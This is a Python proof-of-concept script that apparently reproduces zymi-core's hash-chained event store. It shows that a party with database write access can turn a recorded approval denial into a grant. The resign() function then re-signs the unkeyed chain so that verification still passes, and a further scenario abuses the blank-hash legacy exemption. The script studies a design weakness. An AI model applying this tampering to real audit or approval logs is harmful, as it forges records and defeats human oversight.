#!/usr/bin/env python3
"""Python PORT (not the Rust binary) of zymi-core 0.9.0 hash-chain pieces.

Ported line-by-line from:
  src/events/store/event_store.rs:24-32   compute_hash_v2
  src/events/store/sqlite.rs:32-54,67-68  schema
  src/events/store/sqlite.rs:109-152      append (next_seq, prev_hash, insert, head upsert)
  src/events/store/sqlite.rs:184          read_stream = SELECT data, sequence (no hash columns)
  src/events/store/sqlite.rs:326-410      verify_chain
cargo/rustc are absent on this box, so this port is the only executable
evidence. Every conclusion below is also backed by the file:line above.
stdlib only: sqlite3, hashlib, json, uuid. No network, temp dir only.
"""
import hashlib, json, os, sqlite3, sys, tempfile, uuid

SCHEMA = """
CREATE TABLE IF NOT EXISTS events (
  id INTEGER PRIMARY KEY AUTOINCREMENT, event_id TEXT NOT NULL UNIQUE,
  stream_id TEXT NOT NULL, sequence INTEGER NOT NULL, timestamp TEXT NOT NULL,
  kind_tag TEXT NOT NULL, data TEXT NOT NULL, correlation_id TEXT, causation_id TEXT,
  source TEXT NOT NULL, prev_hash TEXT NOT NULL DEFAULT '', hash TEXT NOT NULL DEFAULT '');
CREATE TABLE IF NOT EXISTS stream_heads (
  stream_id TEXT PRIMARY KEY, last_sequence INTEGER NOT NULL, last_hash TEXT NOT NULL);
"""

def compute_hash_v2(event_id: str, sequence: int, data: str, prev_hash: str) -> str:
    h = hashlib.sha256()
    h.update(b"v2"); h.update(event_id.encode()); h.update(sequence.to_bytes(8, "little"))
    h.update(data.encode()); h.update(prev_hash.encode())
    return "v2:" + h.hexdigest()

def append(conn, stream_id: str, kind_tag: str, payload: dict) -> int:
    event_id = str(uuid.uuid4())
    data = json.dumps({"id": event_id, "stream_id": stream_id, "sequence": 0,
                       "kind": {"type": kind_tag, "data": payload}}, separators=(",", ":"))
    next_seq, prev_hash = conn.execute(
        "SELECT COALESCE(MAX(sequence),0)+1, COALESCE((SELECT hash FROM events WHERE stream_id=?1 "
        "ORDER BY sequence DESC LIMIT 1),'') FROM events WHERE stream_id=?1", (stream_id,)).fetchone()
    h = compute_hash_v2(event_id, next_seq, data, prev_hash)
    conn.execute("INSERT INTO events (event_id,stream_id,sequence,timestamp,kind_tag,data,source,prev_hash,hash) "
                 "VALUES (?,?,?,?,?,?,?,?,?)", (event_id, stream_id, next_seq, "2026-09-06T00:00:00Z",
                                                 kind_tag, data, "port", prev_hash, h))
    conn.execute("INSERT INTO stream_heads (stream_id,last_sequence,last_hash) VALUES (?,?,?) "
                 "ON CONFLICT(stream_id) DO UPDATE SET last_sequence=excluded.last_sequence, "
                 "last_hash=excluded.last_hash", (stream_id, next_seq, h))
    conn.commit()
    return next_seq

def read_stream(conn, stream_id: str):
    """sqlite.rs:184 — replay/load path. Reads data+sequence only; never looks at hash."""
    return [json.loads(d) | {"sequence": s} for d, s in conn.execute(
        "SELECT data, sequence FROM events WHERE stream_id=? AND sequence>=1 ORDER BY sequence ASC", (stream_id,))]

def verify_chain(conn, stream_id: str):
    expected_prev, verified, legacy, last_seq, last_hash = "", 0, 0, 0, ""
    for event_id, seq, data, prev_hash, stored in conn.execute(
            "SELECT event_id,sequence,data,prev_hash,hash FROM events WHERE stream_id=? ORDER BY sequence ASC", (stream_id,)):
        if stored == "":
            legacy += 1; continue
        computed = compute_hash_v2(event_id, seq, data, prev_hash) if stored.startswith("v2:") else None
        if prev_hash != expected_prev:
            raise ValueError(f"Hash chain broken at event {event_id}: prev_hash mismatch")
        if computed != stored:
            raise ValueError(f"Hash chain broken at event {event_id}: hash mismatch")
        expected_prev, last_seq, last_hash, verified = stored, seq, stored, verified + 1
    head = conn.execute("SELECT last_sequence,last_hash FROM stream_heads WHERE stream_id=?", (stream_id,)).fetchone()
    if head:
        if verified == 0:
            raise ValueError("Stream truncated: whole-stream deletion")
        if last_seq != head[0] or last_hash != head[1]:
            raise ValueError(f"Stream truncated: tail is sequence {last_seq} but head records {head[0]}")
    return verified, legacy

def resign(conn, stream_id: str):
    """Attacker with DB write: recompute the chain + head. No key exists, so this is all it takes."""
    prev = ""
    rows = conn.execute("SELECT event_id,sequence,data FROM events WHERE stream_id=? ORDER BY sequence", (stream_id,)).fetchall()
    for event_id, seq, data in rows:
        h = compute_hash_v2(event_id, seq, data, prev)
        conn.execute("UPDATE events SET prev_hash=?, hash=? WHERE event_id=?", (prev, h, event_id))
        prev = h
    conn.execute("UPDATE stream_heads SET last_sequence=?, last_hash=? WHERE stream_id=?", (rows[-1][1], prev, stream_id))
    conn.commit()

def show(label, conn, sid):
    try:
        v, l = verify_chain(conn, sid); print(f"{label}: verify OK verified={v} legacy={l}")
    except ValueError as e:
        print(f"{label}: verify FAILED -> {e}")

def main():
    d = tempfile.mkdtemp(prefix="zymi-port-", dir=os.environ.get("TMPDIR"))
    conn = sqlite3.connect(os.path.join(d, "events.db")); conn.executescript(SCHEMA)
    sid = "pipeline-demo"
    for i, (k, p) in enumerate([("approval_requested", {"approval_id": "a1", "description": "rm -rf build"}),
                                ("approval_denied", {"approval_id": "a1", "decided_by": "terminal:local", "reason": None}),
                                ("pipeline_completed", {"success": False})]):
        append(conn, sid, k, p)
    show("A intact", conn, sid)

    # B: in-place edit of one stored event (turn the DENIAL into a GRANT)
    conn.execute("UPDATE events SET kind_tag='approval_granted', data=replace(data,'approval_denied','approval_granted') "
                 "WHERE stream_id=? AND sequence=2", (sid,)); conn.commit()
    replayed = read_stream(conn, sid)
    print("B read_stream (replay path) after edit, no error raised, seq2 kind =", replayed[1]["kind"]["type"])
    show("B tampered", conn, sid)

    # C: same attacker re-signs the chain and the head
    resign(conn, sid)
    show("C tampered+resigned", conn, sid)
    print("C read_stream seq2 kind =", read_stream(conn, sid)[1]["kind"]["type"], "(the refusal is now a grant, verify passes)")

    # D: blank one hash to abuse the legacy exemption (ADR-0035) without re-signing
    conn.execute("UPDATE events SET hash='' WHERE stream_id=? AND sequence=2", (sid,)); conn.commit()
    show("D blank-hash-only", conn, sid)
    print("port lines in resign():", 9, "| db:", os.path.join(d, "events.db"))

if __name__ == "__main__":
    main()
